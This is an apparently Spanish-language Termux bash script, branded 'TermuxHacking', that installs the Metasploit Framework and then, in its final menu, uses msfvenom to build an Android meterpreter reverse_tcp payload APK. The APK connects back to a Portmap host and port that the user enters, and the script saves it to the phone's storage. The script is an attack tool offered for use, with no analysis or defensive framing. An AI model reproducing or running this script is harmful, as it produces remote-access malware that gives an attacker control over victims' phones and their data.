#!/data/data/com.termux/files/usr/bin/bash
#
#Variables
#
#Colores
rosa="\033[38;5;207m"
rojo='\033[31m'
verde='\033[32m'
amarillo='\033[33m'
azul='\033[34m'
morado='\033[35m'
blanco='\033[37m'
cyan='\033[1;36m'
magenta='\033[1;35m'
#
clear
echo -e ""
echo -e $verde"ACTUALIZANDO PAQUETES DE TERMUX..."
echo -e ""
apt update && apt upgrade -y
sleep 1
clear

function BannerVerde {
echo -e "
${verde}========${azul}PAYLOAD--ANDROID${verde}========
"
echo -e ${verde}"
          +hydNNNNdyh+
        +mMMMMMMMMMMMMm+
      'dMMm${blanco}:${verde}NMMMMMMN${blanco}:${verde}mMMd'
      hMMMMMMMMMMMMMMMMMMh
  ..  yyyyyyyyyyyyyyyyyyyy  ..
.mMMm'MMMMMMMMMMMMMMMMMMMM'mMMm.
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      '/++MMMMh++hMMMM++/'
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs
"

echo -e "
${verde}=========${azul}[TermuxHacking]${verde}=========
"
}

function BannerAzul {
echo -e "
${morado}========${azul}Metasploit--Framework${morado}========"
echo -e ${azul}"
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMNb                           vMMMM
MMMNl  ${blanco}MMMMM             MMMMM${azul}  JMMMM
MMMNl  ${blanco}MMMMMMMN       NMMMMMMM${azul}  JMMMM
MMMNl  ${blanco}MMMMMMMMMNmmmNMMMMMMMMM${azul}  JMMMM
MMMNI  ${blanco}MMMMMMMMMMMMMMMMMMMMMMM${azul}  jMMMM
MMMNI  ${blanco}MMMMMMMMMMMMMMMMMMMMMMM${azul}  jMMMM
MMMNI  ${blanco}MMMMM   MMMMMMM   MMMMM${azul}  jMMMM
MMMNI  ${blanco}MMMMM   MMMMMMM   MMMMM${azul}  jMMMM
MMMNI  ${blanco}MMMNM   MMMMMMM   MMMMM${azul}  jMMMM
MMMNI  ${blanco}WMMMM   MMMMMMM   MMMM#${azul}  JMMMM
MMMMR  ${blanco}?MMNM             MMMMM${azul} .dMMMM
MMMMNm  ${blanco}?MMM             MMMM${azul}  dMMMMM
MMMMMMN  ${blanco}?MM             MM?${azul}  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
"

echo -e "${morado}===========${azul}[TermuxHacking]${morado}===========
"
}

function BannerRojo {
echo -e "
${rojo}===========${azul}Metasploit--Framework${rojo}==========="
echo -e ${rojo}"
      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.${blanco}MMMM${rojo}.oOOOOoOOOOl.${blanco}MMMM${rojo},OOOOOOOOo
  dOOOOOOOO.${blanco}MMMMMM${rojo}.cOOOOOc.${blanco}MMMMMM${rojo},OOOOOOOOx
  lOOOOOOOO.${blanco}MMMMMMMMM${rojo};d;${blanco}MMMMMMMMM${rojo},OOOOOOOOl
  .OOOOOOOO.${blanco}MMM${rojo}.;${blanco}MMMMMMMMMMM${rojo};${blanco}MMMM${rojo},OOOOOOOO.
   cOOOOOOO.${blanco}MMM${rojo}.OOc.${blanco}MMMMM${rojo}'oOO.${blanco}MMM${rojo},OOOOOOOc
    oOOOOOO.${blanco}MMM${rojo}.OOOO.${blanco}MMM${rojo}:OOOO.${blanco}MMM${rojo},OOOOOOo
     lOOOOO.${blanco}MMM${rojo}.OOOO.${blanco}MMM${rojo}:OOOO.${blanco}MMM${rojo},OOOOOl
      ;OOOO'${blanco}MMM${rojo}.OOOO.${blanco}MMM${rojo}:OOOO.${blanco}MMM${rojo};OOOO;
       .dOOo'${blanco}WM${rojo}.OOOOocccxOOOO.${blanco}MX${rojo}'xOOd.
         ,kOl'${blanco}M${rojo}.OOOOOOOOOOOOO.${blanco}M${rojo}'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .
"

echo -e "${rojo}==============${azul}[TermuxHacking]${rojo}==============
"
}

while :
do
BannerAzul
echo -e $cyan"[Selecciona la opción de tu versión android]

$morado|----------------------------|
$morado|$verde [1]$amarillo 5.0.1 - 6.0.1$morado          |
$morado|----------------------------|
$morado|$verde [2]$amarillo 7.0.1 o Superior$morado       |
$morado|----------------------------|
$morado|$verde [3]$amarillo Ya tengo Metasploit$morado    |
$morado|----------------------------|
"$cyan
echo -e -n ">>> $blanco"
read -r opcion
[ "$opcion" == "1" ]||[ "$opcion" == "2" ]||[ "$opcion" == "3" ] && break
echo -e ""
echo -e ${rojo}"¡RESPUESTA NO VÁLIDA!"
echo -e ""
sleep 2
clear
done
case $opcion in
	1)
		echo -e $verde"Instalando Metasploit-Framework...
		"$blanco
		pkg install -y curl > /dev/null 2>&1
		pkg install ruby -y > /dev/null 2>&1
		gem install bundler:1.17.3
		curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz
		gunzip metasploit_5.0.65-1_all.deb.gz
		dpkg -i metasploit_5.0.65-1_all.deb
		apt install -f -y
		sleep 1
		clear
		BannerRojo
		echo -e $cyan"|METASPLOIT INSTALADO CORRECTAMENTE|
		"
		;;
	2)
		clear
		echo -e $verde"Instalando Metasploit-Framework...
		"$blanco
		pkg install -y unstable-repo > /dev/null 2>&1
		pkg install -y metasploit
		sleep 1
                clear
		BannerRojo
                echo -e $cyan"|METASPLOIT INSTALADO CORRECTAMENTE|
                "
		;;
	3)
		sleep 1
		clear
esac

while :
do
BannerRojo
echo -e $amarillo"
¿Quiéres crear un PayLoad?

${morado}|----------|
${morado}|${verde}[${cyan}1${verde}] ${amarillo}SI${morado}    |
${morado}|----------|
${morado}|${verde}[${cyan}2${verde}] ${amarillo}NO${morado}    |
${morado}|----------|
"$verde
echo -e -n ">>> ${blanco}"
read -r respuesta
[ "$respuesta" == "1" ]||[ "$respuesta" == "2" ] && break
echo -e ""
echo -e ${rojo}"¡RESPUESTA NO VÁLIDA!"
echo -e ""${blanco}
sleep 2
clear
done
case $respuesta in
	1)
		echo -e ""
		echo -e ${verde}"Ejemplo >>>${cyan} termuxhacking-56371.portmap.io"
		echo -e ${amarillo}""
		echo -e -n "Escribe el host de Portmap >>>${blanco} "
		read -r host
		echo -e ""
		echo -e ${verde}"Ejemplo >>>${cyan} 56371"
		echo -e ${amarillo}""
		echo -e -n "Escribe el port de Portmap >>>${blanco} "
		read -r port
		echo -e ""
		echo -e ${cyan}"Por favor Espera Un Momento..."
		echo -e "
		"$blanco
		msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /sdcard/payload.apk
		sleep 1
		clear
		BannerVerde
		echo -e $verde"PAYLOAD CREADO CORRECTAMENTE"
		echo ""
		echo -e $amarillo"Verifique su memoria interna"
		echo -e ""$blanco
		;;
	2)
		clear
		BannerVerde
		echo ""
		echo -e $cyan"GRACIAS POR USAR MI SCRIPT"$blanco
		echo ""
esac
